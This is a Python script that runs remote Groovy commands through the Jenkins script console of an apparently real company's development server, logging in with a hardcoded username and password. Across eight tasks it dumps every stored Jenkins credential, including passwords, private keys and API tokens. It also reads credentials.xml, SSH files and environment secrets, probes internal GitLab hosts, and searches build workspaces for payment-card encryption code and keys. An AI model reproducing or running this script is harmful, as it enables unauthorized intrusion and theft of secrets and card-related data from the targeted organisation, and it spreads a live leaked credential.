import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=180).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK 1: Find GitLab credentials in Jenkins ─────────────────
script1 = """
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(
    StandardCredentials.class,
    Jenkins.instance,
    null,
    null
)

println "=== ALL CREDENTIALS (${creds.size()} total) ==="
creds.each { c ->
    println "\\n--- ID: ${c.id} | Type: ${c.class.simpleName} | Desc: ${c.description} ---"
    if (c.respondsTo('getUsername')) println "  User: ${c.getUsername()}"
    if (c.respondsTo('getPassword')) println "  Pass: ${c.getPassword()}"
    if (c.respondsTo('getPrivateKey')) println "  Key: ${c.getPrivateKey()?.take(500)}"
    if (c.respondsTo('getSecret')) println "  Secret: ${c.getSecret()}"
    if (c.respondsTo('getApiToken')) println "  ApiToken: ${c.getApiToken()}"
}
"""

jenkins_exec(script1, "ALL JENKINS CREDENTIALS DUMP")
time.sleep(1)

# ── TASK 2: Git URLs from job configs ──────────────────────────
script2 = """
def r = ["bash","-c",\"\"\"grep -rh 'url\\|gitlab\\|github\\|bitbucket\\|gitlabUrl' /var/jenkins_home/jobs/*/config.xml /var/jenkins_home/jobs/*/*/config.xml 2>/dev/null | grep -i '<url>\\|userRemote\\|gitUrl\\|http.*\\.git\\|ssh.*\\.git' | sort -u | head -50\"\"\"].execute().text
println r
"""
jenkins_exec(script2, "GIT REPO URLs FROM JOB CONFIGS")
time.sleep(1)

# ── TASK 3: GitLab API probe (Python3 compatible) ─────────────
script3 = """
def r = ["bash","-c",\"\"\"python3 -c "
import urllib.request, ssl, json
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

urls = [
    'http://gitlab.dev.claroshop.com',
    'https://gitlab.dev.claroshop.com',
    'http://172.27.140.148',
    'http://172.27.140.148:80',
    'http://172.27.140.148:8929',
    'http://172.27.140.148:8080',
    'http://10.0.0.0/api/v4/version',
    'http://gitlab',
    'http://gitlab.claroshop.com'
]
for base in urls:
    url = base if 'api' in base else base + '/api/v4/projects?per_page=3'
    try:
        r = urllib.request.urlopen(url, timeout=5, context=ctx if 'https' in url else None)
        print('OPEN ' + url + ': ' + r.read()[:300].decode('utf-8','ignore'))
    except urllib.error.HTTPError as e:
        print('HTTP_' + str(e.code) + ' ' + url)
    except Exception as e:
        print('ERR ' + url + ': ' + str(e)[:80])
" 2>&1\"\"\"].execute().text
println r
"""
jenkins_exec(script3, "GITLAB API PROBE")
time.sleep(1)

# ── TASK 4: Search workspaces for encryption code ─────────────
script4 = """
def r = ["bash","-c",\"\"\"
echo '=== ENCRYPT FILES FOUND ==='
find /var/jenkins_home/jobs -path '*/workspace*' \\( -name '*.php' -o -name '*.java' \\) 2>/dev/null | xargs grep -l 'datostarjeta\\|llave_encriptacion\\|encript\\|decrypt\\|mcrypt_encrypt\\|tarjeta\\|card.*encr\\|encr.*card' 2>/dev/null | head -20

echo ''
echo '=== CATTING ENCRYPT FILES ==='
for f in \$(find /var/jenkins_home/jobs -path '*/workspace*' -name '*.php' 2>/dev/null | xargs grep -l 'mcrypt\\|openssl_encrypt\\|encript\\|llave_encript' 2>/dev/null | head -5); do
 echo "=== FILE: \$f ==="
 cat "\$f" 2>/dev/null | head -150
 echo ""
done
\"\"\"].execute().text
println r
"""
jenkins_exec(script4, "WORKSPACE ENCRYPTION CODE SEARCH")
time.sleep(1)

# ── TASK 5: GitLab token from environment / config files ───────
script5 = """
def r = ["bash","-c",\"\"\"
echo '=== ENV VARS WITH GITLAB/TOKEN ==='
env | grep -i 'gitlab\\|git_token\\|git_pass\\|git_user\\|token\\|secret' 2>/dev/null | head -20

echo ''
echo '=== JENKINS GLOBAL CONFIGS WITH GIT ==='
grep -r 'gitHubServerUrl\\|gitLabServerUrl\\|gitLabUrl\\|gitlab_url\\|GITLAB\\|gitlab.com\\|claroshop.*git' /var/jenkins_home/*.xml /var/jenkins_home/config.xml 2>/dev/null | head -20

echo ''
echo '=== CREDENTIAL STORE FILES ==='
ls -la /var/jenkins_home/credentials.xml 2>/dev/null
cat /var/jenkins_home/credentials.xml 2>/dev/null | head -100

echo ''
echo '=== SSH KEYS ==='
ls -la /var/jenkins_home/.ssh/ 2>/dev/null
cat /var/jenkins_home/.ssh/known_hosts 2>/dev/null | head -20
\"\"\"].execute().text
println r
"""
jenkins_exec(script5, "GITLAB TOKEN / ENV / CONFIG FILES")
time.sleep(1)

# ── TASK 6: Network scan for GitLab internal IP ───────────────
script6 = """
def r = ["bash","-c",\"\"\"
echo '=== HOSTNAME & NETWORK ==='
hostname && ip addr show 2>/dev/null | grep 'inet ' | head -10

echo ''
echo '=== /etc/hosts FOR GITLAB ==='
cat /etc/hosts | grep -i 'git\\|lab\\|scm\\|vcs\\|repo'

echo ''
echo '=== NMAP/PING GITLAB HOSTS ==='
for h in gitlab.dev.claroshop.com gitlab.claroshop.com git.dev.claroshop.com scm.dev.claroshop.com; do
  result=\$(getent hosts \$h 2>/dev/null || nslookup \$h 2>/dev/null | grep 'Address:' | tail -1)
  echo "\$h => \$result"
done

echo ''
echo '=== CURL GITLAB INTERNAL ==='
for url in http://gitlab.dev.claroshop.com/api/v4/version https://gitlab.dev.claroshop.com/api/v4/version; do
  echo "--- \$url ---"
  curl -sk --max-time 5 "\$url" 2>&1 | head -5
done
\"\"\"].execute().text
println r
"""
jenkins_exec(script6, "NETWORK SCAN FOR GITLAB")
time.sleep(1)

# ── TASK 7: List Jenkins jobs / pipelines referencing claroshop crypto ──
script7 = """
def r = ["bash","-c",\"\"\"
echo '=== JOB NAMES ==='
ls /var/jenkins_home/jobs/ 2>/dev/null | head -50

echo ''
echo '=== JOBS WITH CRYPTO/TARJETA KEYWORDS ==='
grep -rl 'tarjeta\\|encript\\|encrypt\\|datostarjeta\\|llave' /var/jenkins_home/jobs/*/config.xml /var/jenkins_home/jobs/*/*/config.xml 2>/dev/null | head -10

echo ''
echo '=== LAST BUILDS SCM URLS ==='
find /var/jenkins_home/jobs -name 'build.xml' -newer /var/jenkins_home/jobs 2>/dev/null | head -5 | xargs grep -h 'remoteUrl\\|repoUrl' 2>/dev/null
\"\"\"].execute().text
println r
"""
jenkins_exec(script7, "JENKINS JOBS / CRYPTO KEYWORD SEARCH")
time.sleep(1)

# ── TASK 8: Direct GitLab clone via credential ID found ────────
script8 = """
// Try to use whatever git credential was found to hit GitLab API
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import jenkins.model.Jenkins

def allCreds = CredentialsProvider.lookupCredentials(
    StandardCredentials.class,
    Jenkins.instance,
    null,
    null
)

// Print ALL credentials without filter
allCreds.each { c ->
    try {
        println "=== ${c.id} | ${c.class.simpleName} | ${c.description} ==="
        if (c.respondsTo('getUsername')) println "  U: ${c.getUsername()}"
        if (c.respondsTo('getPassword')) println "  P: ${c.getPassword()}"
        if (c.respondsTo('getSecret')) println "  S: ${c.getSecret()}"
        if (c.respondsTo('getPrivateKeySource')) println "  PK_SRC: ${c.getPrivateKeySource()?.class?.simpleName}"
        if (c.respondsTo('getPrivateKey')) println "  PK: ${c.getPrivateKey()?.take(200)}"
        if (c.respondsTo('getPassphrase')) println "  PP: ${c.getPassphrase()}"
        if (c.respondsTo('getApiToken')) println "  API: ${c.getApiToken()}"
    } catch(ex) {
        println "  ERROR: ${ex.message}"
    }
}
"""
jenkins_exec(script8, "FULL CREDENTIAL DUMP (ALL TYPES)")
time.sleep(1)

print("\n\n[DONE] All 8 tasks completed.")
